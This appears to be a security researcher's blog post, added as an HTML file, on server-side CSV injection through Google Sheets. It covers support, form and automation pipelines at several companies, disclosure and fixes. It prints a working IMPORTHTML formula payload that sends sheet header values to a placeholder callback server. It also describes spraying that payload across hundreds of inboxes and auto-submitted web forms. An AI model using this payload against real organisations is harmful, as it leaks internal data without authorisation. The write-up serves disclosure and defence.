@@ -1,0 +1,473 @@
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Who Needs a Blind XSS? Server-Side CSV Injection | Hx01</title>
+
+  <!-- Page Description -->
+  <meta name="description"
+        content="How simple spreadsheet formulas ended up running inside support, sales, and privacy workflows across major companies.">
+
+  <link rel="canonical" href="https://hx01.me/hailcsv.html">
+
+  <!-- Browser Settings -->
+  <meta name="theme-color" content="#ffffff">
+
+  <!-- Social Preview -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Who Needs a Blind XSS? Server-Side CSV Injection">
+  <meta property="og:description"
+        content="A look at how unescaped spreadsheet formulas execute inside company workflows.">
+  <meta property="og:image" content="https://hx01.me/images/hailcsv-title.png">
+  <meta property="og:url" content="https://hx01.me/hailcsv.html">
+  <meta property="og:site_name" content="Hx01">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Who Needs a Blind XSS? Server-Side CSV Injection">
+  <meta name="twitter:description"
+        content="How spreadsheet formulas quietly ran inside internal systems.">
+  <meta name="twitter:image" content="https://hx01.me/images/hailcsv-title.png">
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="https://unpkg.com/terminal.css@0.7.2/dist/terminal.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  <!-- All your styles (unchanged, only organised + non-jargon) -->
+  <style>
+    .components-grid {
+      display: grid;
+      grid-column-gap: 1.4em;
+      grid-template-columns: auto;
+    }
+
+    .image-grid {
+      display: grid;
+      grid-gap: 1em;
+      grid-template-columns: repeat(auto-fit, minmax(calc(var(--page-width) / 12), 1fr));
+    }
+
+    @media (min-width: 70em) {
+      .components-grid {
+        grid-template-columns: 3fr 9fr;
+      }
+    }
+
+    .credit-card {
+      border: 1px solid var(--secondary-color);
+      border-radius: 6px;
+      padding: 1.6em;
+      background: #1f1f21;
+      margin-top: 3em;
+    }
+
+    .credit-card h3 {
+      margin: 0 0 0.8em 0;
+      font-size: 1.4rem;
+      color: var(--primary-color);
+    }
+
+    .credit-entry {
+      margin-bottom: 0.5em;
+    }
+
+    .credit-entry a {
+      color: var(--primary-color);
+      text-decoration: none;
+    }
+
+    .credit-entry a:hover {
+      text-decoration: underline;
+    }
+
+    /* Avatar sizes */
+    .hero-card-avatar img {
+      border-radius: 50%;
+      width: 120px;
+      height: 120px;
+      object-fit: cover;
+      margin-bottom: 10px;
+    }
+
+    @media (max-width: 768px) {
+      .hero-card-avatar img {
+        width: 80px;
+        height: 80px;
+      }
+
+      .hero-card-avatar-name {
+        font-size: 0.9rem;
+      }
+    }
+
+    @media (max-width: 420px) {
+      .hero-card-avatar img {
+        width: 65px;
+        height: 65px;
+      }
+    }
+
+    /* Base image rules */
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    .hero-card {
+      padding: 2.4em;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 2em;
+    }
+
+    .hero-card-title {
+      flex: 1;
+    }
+
+    .hero-card-avatar {
+      text-align: center;
+      min-width: 140px;
+    }
+
+    .hero-card-avatar-name {
+      color: var(--secondary-color);
+    }
+
+    @media (max-width: 768px) {
+      .hero-card {
+        flex-direction: column-reverse;
+        align-items: flex-start;
+        padding: 1.6em;
+      }
+
+      .hero-card-title h1 {
+        font-size: 1.6rem;
+      }
+
+      .hero-card-title .terminal-prompt {
+        font-size: 1rem;
+      }
+
+      .hero-card-avatar {
+        align-self: center;
+        min-width: 0;
+      }
+
+      pre {
+        overflow-x: auto;
+      }
+    }
+
+    /* Home button */
+    .home-btn {
+      display: inline-block;
+      padding: 6px 14px;
+      border: 1px solid var(--secondary-color);
+      border-radius: 4px;
+      background: #1f1f21;
+      color: var(--primary-color);
+      text-decoration: none;
+      font-size: 0.95rem;
+    }
+
+    .home-btn:hover {
+      background: #2a2a2d;
+      text-decoration: underline;
+    }
+
+    /* Result cards */
+    .result-card {
+      border: 1px solid var(--secondary-color);
+      border-radius: 6px;
+      padding: 1em;
+      background: #1f1f21;
+      margin: 1.5em 0;
+      overflow: hidden;
+    }
+
+    .result-card img {
+      width: 100%;
+      border-radius: 4px;
+      object-fit: contain;
+    }
+
+    .result-caption {
+      margin-top: 0.6em;
+      font-size: 0.9rem;
+      color: var(--secondary-color);
+      text-align: center;
+    }
+
+    @media (max-width: 600px) {
+      .result-card {
+        padding: 0.8em;
+      }
+    }
+
+    :root {
+      --global-font-size: 15px;
+      --global-line-height: 1.4em;
+      --global-space: 10px;
+      --font-stack: Menlo, Monaco, Consolas, monospace;
+      --mono-font-stack: Menlo, Monaco, Consolas, monospace;
+      --background-color: #222225;
+      --page-width: 60em;
+      --font-color: #e8e9ed;
+      --invert-font-color: #222225;
+      --secondary-color: #a3abba;
+      --primary-color: #62c4ff;
+      --code-bg-color: #3f3f44;
+    }
+  </style>
+</head>
+
+<body class="terminal">
+  <div class="container">
+<div class="terminal-nav" style="display: flex; justify-content: space-between; align-items: center;">
+  
+  <!-- Left side: file path -->
+  <header class="terminal-logo">
+    <div class="logo terminal-prompt">
+      <a class="no-style">$ cat /hx01/hailcsv.md</a>
+    </div>
+  </header>
+
+  <!-- Right side: Home button -->
+  <a class="home-btn" href="https://hx01.me">Home</a>
+
+</div>
+
+
+
+    <section>
+
+<section>
+  <div class="terminal-card hero-card" style="padding: 2.4em; display: flex; justify-content: space-between; align-items: center; gap: 2em;">
+
+    <!-- Left Side: Title -->
+    <div style="flex: 1;">
+
+      <h1 style="margin-top: 0; font-size: 2rem; line-height: 1.3;">
+        Who Needs a Blind XSS?  
+        <span style="color: var(--primary-color);">
+          Server-Side CSV Injection Across Support Pipelines
+        </span>
+      </h1>
+    </div>
+
+    <!-- Right Side: Avatar -->
+    <div style="text-align: center; min-width: 160px;">
+      <img
+        src="https://profiles.bugcrowdusercontent.com/avatars/a2d179a4a201406d4ce6138b0b1c86d7/normal_man-naturo-running-area-51-alienstock-rachel-17.jpg"
+        alt="Hx01 avatar"
+        style="border-radius: 50%; width: 120px; height: 120px; object-fit: cover; margin-bottom: 10px;"
+      >
+      <div style="font-size: 1rem; color: var(--secondary-color);">
+        Hx01
+      </div>
+    </div>
+
+  </div>
+</section>
+<br>
+
+    <p>Blind XSS has a certain charm: you send a payload, walk away, and at some unpredictable moment an internal system executes it for you. During this research, I ended up with something that behaved almost the same but without any browser, DOM, HTML, or admin panel involved.</p>
+    <p>Server-Side CSV Injection sits in the dullest parts of modern companies: CSV exports, Google Sheets, automation tools, Salesforce reports, and internal dashboards. It triggers when spreadsheet engines interpret user-supplied text as formulas and silently execute them inside backend workflows. Because so many organisations push untrusted data into Sheets at some point, the impact turned out to be both broader and more surprising than expected.</p>
+    <p>This is how I, along with Sajeeb and Eric (Todayisnew), took a simple spreadsheet formula and traced it across support, sales, privacy, advertising, and bug bounty pipelines and even caught a spreadsheet vendor using their competitor&#39;s spreadsheet engine.</p>
+
+    <hr>
+
+    <h2 id="from-theory-to-hypothesis">From Theory to Hypothesis</h2>
+    <p>The idea started from a simple observation: companies use Google Sheets in places they probably should not. Support teams forward emails into Sheets. Privacy teams track requests inside Sheets. Sales and advertising teams collect form submissions into Sheets via no-code tools. If any of these pipelines ingest unescaped user input, Sheets will treat it as a formula, not text.</p>
+    <p>Here is how the typical vulnerable workflow looks:</p>
+
+    <pre><code>┌─────────────────┐
+│  User submits   │
+│  support ticket │
+│  or form        │
+└────────┬────────┘
+         │
+         ▼
+┌─────────────────┐
+│   Support CRM   │
+│  (Zendesk, SF)  │
+└────────┬────────┘
+         │
+         │ Employee exports CSV
+         │ OR automation syncs
+         ▼
+┌─────────────────┐
+│  Google Sheets  │◄── Formula executes here
+│                 │
+│  = IMPORTHTML() │──► Outbound HTTP request
+└─────────────────┘
+</code></pre>
+
+    <p>That was enough to suspect a real-world blind execution vector hiding in plain sight. I reached out to Sajeeb with the question: could we test for this at scale?</p>
+
+    <hr>
+
+    <h2 id="building-the-canary">Building the Canary</h2>
+    <p>To test this safely and at scale, we needed a payload that confirmed formula execution, identified which submission triggered it, and revealed the shape of the sheet it executed inside. Sajeeb built a canary system to detect pingbacks from vulnerable companies and created an intake system to monitor and log responses.</p>
+    <p>The payload we used was:</p>
+
+    <pre><code>=IMPORTHTML("https://{subdomain-with-payload-id}.our-server.com/log?v=" &amp; CONCATENATE(A1:E1), "table", 1)
+</code></pre>
+
+    <p>Each submission received a unique <code>{subdomain-with-payload-id}</code>. When the formula executed, Google Sheets sent an HTTP request to that specific subdomain, letting us pinpoint the exact test that fired. The <code>v=</code> parameter came from <code>CONCATENATE(A1:E1)</code>, which concatenated the first five cells of the sheet&#39;s header row, typically column names like Name, Email, Message, and so on. This gave us a fingerprint of the sheet structure without accessing actual user data.</p>
+    <p>The server just logged host, path, query, timestamp, and UA. That alone proved execution and exposed internal workflow timing. The infrastructure worked as expected. Now we needed to test it.</p>
+
+    <hr>
+
+    <h2 id="first-wave-support-emails-and-silence">First Wave: Support Emails and Silence</h2>
+    <p>Eric came in to help scale the testing. He sprayed the payload across hundreds of support and contact email addresses, customer service inboxes, general inquiries, technical support channels. The approach was broad and fast, but it was also incomplete. It missed critical intake channels that did not expose email addresses publicly: leads forms, sales contact pages, partnership applications, and advertising submission forms.</p>
+    <p>More importantly, the first wave produced nothing. Zero callbacks. Zero proof the vulnerability existed anywhere but in theory.</p>
+    <p>That silence revealed something important: nothing executes until someone pushes the data into a spreadsheet. Email alone does not trigger this. The vulnerability only activates when a human exports a CSV from a CRM or when an automation tool syncs the data into Sheets. That meant our initial coverage was missing entire categories of intake and that we would need patience.</p>
+
+    <hr>
+
+    <h2 id="expanding-coverage-web-forms-and-the-messy-bot">Expanding Coverage: Web Forms and the Messy Bot</h2>
+    <p>Most companies move away from email and toward web forms for leads, advertising requests, partnership enquiries, and onboarding. These often go directly into Sheets through automation platforms like Zapier or Workato. To reach them, Sajeeb built a bot that detected forms and auto-submitted the payload.</p>
+    <p>It was not elegant. The bot was clunky, missed modern JavaScript-heavy frontends often, and failed to complete many submissions. But when it worked, it reached intake surfaces we could not access any other way.</p>
+    <p>One of the first hits from this route came from the advertising contact flow of a popular streaming platform. The callback came within hours of submission, revealing their ad-sales team operated directly on top of Google Sheets with no server-side sanitization. Our payload, submitted through their web form, eventually landed in a Sheet used by the advertising team. When the automation inserted the row, Sheets evaluated the formula and called our server with concatenated form values.</p>
+    <div class="result-card">
+  <img src="https://hx01.me/images/hailcsv-4.png" alt="Advertising Form Leaking Data">
+    <div class="result-caption"></div></div><p>This confirmed that the entire ad-intake workflow lived directly on top of Google Sheets and that the vulnerability was real.</p>
+
+    <hr>
+
+    <h2 id="the-20-day-wait-and-then-everything-lit-up-">The 20-Day Wait (and Then Everything Lit Up)</h2>
+    <p>But that streaming platform hit was an outlier. For most of our tests, nothing happened immediately. Days passed. Then weeks.</p>
+    <p>For 20 days after the initial spray, we received no callbacks from the support email submissions. Zero confirmation that any of those hundreds of payloads had reached a spreadsheet.</p>
+    <p>Then, on day 21, the first pingback arrived from a major cryptocurrency exchange.</p>
+    <div class="result-card">
+  <img src="https://hx01.me/images/hailcsv-1.png" alt="Cryptocurrency Exchange Leaking Data">
+  <div class="result-caption">Celeberation Time!!</div>
+</div>
+    <p>The formula had executed inside their internal privacy-tracking sheet. Our payload had traveled through their support pipeline, been exported or synced, and finally landed somewhere that evaluated it. The callback contained concatenated values from the sheet&#39;s header row, confirming the workflow used Google Sheets to manage privacy requests.</p>
+    <p>After that first confirmation, the callbacks started rolling in periodically from multiple organizations. Each one arrived at unpredictable intervals, triggered by whatever internal workflow finally pushed the data into a spreadsheet.</p>
+
+
+    <hr>
+
+ <h2 id="what-the-callbacks-revealed">What the Callbacks Revealed</h2>
+
+<p>As more callbacks arrived, the root cause became clear: every execution happened later in the internal pipeline, never at ingestion. The vulnerability always surfaced at the same place, the moment an organisation's workflow pushed untrusted text into Google Sheets.</p>
+
+<p>This happened in two ways:</p>
+<ul>
+  <li>Employees exporting CSVs from CRMs like Salesforce, Zendesk, or HubSpot and then uploading them into Sheets for reporting or analysis</li>
+  <li>Automation tools like Zapier, Workato, or custom integrations inserting rows directly into Sheets</li>
+  <div class="result-card">
+  <img src="https://hx01.me/images/hailcsv-7.png" alt="Spreadsheet SaaS Leaking Data">
+  <div class="result-caption">An example of such an automation flow shown on Zapier’s page.</div>
+</ul>
+
+<p>This explained why execution was inconsistent. Some workflows ran instantly. Others ran only during weekly reporting cycles. But the results across organisations were identical.</p>
+
+<ul>
+  <li>
+    <strong>A large social media platform:</strong> A large social media platform forwarded emails from its payments-support inbox into a Sheet. The payload executed days later, and the callback contained structural data from the sheet's first row, likely column headers like Ticket ID, User Email, Issue Type.
+  </li>
+  <div class="result-card">
+  <img src="https://hx01.me/images/hailcsv-5.png" alt="Social Media Platform Leaking Data">
+  <div class="result-caption"></div></div>
+  <li>
+    <strong>A major Hotel Chain with 9000+ Properties:</strong> A large hotel chain with more than 9000 properties synced membership application forms directly into Google Sheets. The callback arrived hours after submission, showing that their entire membership onboarding process ran inside a spreadsheet with no input sanitization.
+  </li>
+</ul>
+
+<p>Then the ironic findings appeared.</p>
+
+<ul>
+  <li>
+    <strong>Bug bounty platform live hacking intake:</strong> One bug bounty platform's live hacking event intake form, the form used to onboard security researchers for their events, was wired into a Google Sheet. When the sheet loaded our row, it executed the payload and leaked researcher submission data in the callback. The formula returned concatenated values that appeared to include application responses and researcher details.
+  </li>
+   <div class="result-card">
+  <img src="https://hx01.me/images/hailcsv-2.png" alt="Bugbounty Platform Leaking Data">
+  <div class="result-caption">::Facepalm::</div></div>
+  <li>
+    <strong>Spreadsheet SaaS using Google Sheets:</strong> The most ironic discovery was a spreadsheet SaaS, a direct competitor to Google Sheets, using Google Sheets internally for their own support pipeline. Their support inbox pushed messages into a Sheet, the formula executed, and we received a callback showing first-row data from their internal support sheet. A spreadsheet company relying on their competitor's spreadsheet engine, which then ran our formula without question.
+  </li>
+   <div class="result-card">
+  <img src="https://hx01.me/images/hailcsv-3.png" alt="Spreadsheet SaaS Leaking Data">
+  <div class="result-caption">Never Getting High On Your Supplies Perhaps.</div>
+</ul>
+
+<p>Across all organisations, timing patterns became fingerprints of their internal architecture:</p>
+
+<ul>
+  <li>Near-instant triggers meant form to Sheets automations like Zapier, Workato, Make</li>
+  <li>Hourly or daily triggers pointed to scheduled sync jobs</li>
+  <li>Long, irregular delays, like our 20-day wait, indicated manual CSV exports to Google Sheets uploads</li>
+</ul>
+
+<p>We never needed access to a single internal system. Callback timing alone mapped how data flowed inside each organisation.</p>
+
+    <hr>
+
+    <h2 id="understanding-server-side-csv-injection">Understanding Server-Side CSV Injection</h2>
+    <p>Spreadsheet applications treat values starting with =, +, -, and @ as formulas. If untrusted user input reaches a Google Sheet without escaping, the sheet executes it automatically.</p>
+    <p>Our formula triggered:</p>
+    <ol>
+      <li>Formula parsing by Google Sheets</li>
+      <li>An outbound HTTP request to our controlled domain</li>
+      <li>The concatenation of the first few cell values</li>
+      <li>Blind, delayed execution inside internal systems</li>
+    </ol>
+    <p>This made it behave like Blind XSS except the execution environment was a spreadsheet rather than a browser. Like Blind XSS, we had no visibility into when execution would happen. We just sent the payload, walked away, and waited for the callback.</p>
+    <p>The key difference: we were not exploiting browsers or admin panels. We were exploiting the intersection of untrusted input, CSV exports, and spreadsheet automation, the dullest, least monitored part of most companies&#39; infrastructure.</p>
+
+    <hr>
+
+    <h2 id="responsible-disclosure">Responsible Disclosure</h2>
+    <p>All findings were responsibly disclosed to the affected organizations. The responses varied widely.</p>
+    <p>Most acknowledged the issue and began implementing fixes, typically by escaping formula characters at ingestion points or during CSV export.</p>
+    <p>Others closed the reports entirely, claiming this was social engineering rather than a technical vulnerability. The argument: an employee has to open the CSV file, so it requires user interaction. This overlooks that opening CSV exports is standard business workflow, not social manipulation. When a support manager exports tickets into Sheets for weekly reporting, they are performing routine job functions. The vulnerability exists because the system executes untrusted input as code during normal operations.</p>
+    <p>The nature of this vulnerability makes remediation challenging. The issue does not live in a single codebase or application. It lives in the organizational workflow itself, in the habits of exporting CSVs and uploading them to Sheets, in the automation tools connecting forms to spreadsheets, in the assumption that a CSV file is just data.</p>
+
+    <hr>
+
+    <h2 id="lessons-learned">Lessons Learned</h2>
+    <p>The blind execution did not happen at the frontend. It happened inside the business logic no one thinks about, where CSV files, sheets, and automation workflows intersect. Every industry we tested broke the same way: privacy request tracking, advertising intake, payments support, bug bounty onboarding, and even a spreadsheet SaaS company&#39;s internal operations.</p>
+    <p>If user-controlled text touches Google Sheets, you cannot assume it will stay as text. The spreadsheet will interpret it. And because these workflows are often built by non-technical teams using no-code tools, security reviews rarely happen.</p>
+    <p>The 20-day delay taught us something else: this vulnerability is invisible until it fires. Unlike XSS, where you can inspect the DOM or check the CSP, there is no way to know if your data ended up in a spreadsheet until you receive the callback. Organizations could be vulnerable for years without realizing it.</p>
+
+    <hr>
+
+    <h2 id="recommendations">Recommendations</h2>
+    <ul>
+      <li>Escape or strip formula characters (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>) before anything touches a CSV or spreadsheet. Prefix them with a single quote (<code>&#39;</code>) or strip them entirely.</li>
+      <li>CRM platforms should sanitize CSV exports by default. Salesforce, Zendesk, HubSpot, and similar tools should escape formula characters in all exported data.</li>
+      <li>Automation tools must sanitize before inserting rows into Sheets. Zapier, Workato, Make, and other integration platforms should treat all user input as untrusted.</li>
+      <li>Internal teams should understand that importing CSV files into Sheets is not passive. The sheet will run formulas automatically. Treat every CSV import as a potential code execution event.</li>
+      <li>Treat Sheets as an execution environment, not just a viewer. If your organization uses Google Sheets to track support tickets, privacy requests, leads, or any other user-submitted data, audit those workflows for CSV injection risks.</li>
+    </ul>
+
+    <hr>
+
+    <h2 id="closing-thoughts">Closing Thoughts</h2>
+    <p>All of this came from normal company behaviour: exporting CSVs, uploading reports, syncing workflows, routing form submissions, and letting automations populate Sheets. The formula never needed a user to click anything or open a malicious file. It fired when the organisation did what they always do.</p>
+    <p>It behaved like Blind XSS, delayed, blind execution inside internal systems, except spreadsheets, not browsers, were doing the work. We sent payloads into the void, waited 20 days, and watched as they silently executed across support pipelines, privacy workflows, advertising forms, and even a spreadsheet vendor&#39;s own infrastructure.</p>
+    <p>Which brings us back to the title:</p>
+    <p>Who needs a Blind XSS?</p>
+    <p>@hx01</p>
+
+    <div class="credit-card">
+  <h3>Credits</h3>
+
+  <div class="credit-entry">
+    Research collaboration with <strong>Sajeeb Lohani</strong> —
+    <a href="https://x.com/sml555_" target="_blank">https://x.com/sml555_</a>
+  </div>
+
+  <div class="credit-entry">
+    Research collaboration with <strong>Eric (Todayisnew)</strong> —
+    <a href="https://x.com/codecancare?lang=en" target="_blank">https://x.com/codecancare</a>
+  </div>
+</div>
+
+  </div>
+</body>
+</html>
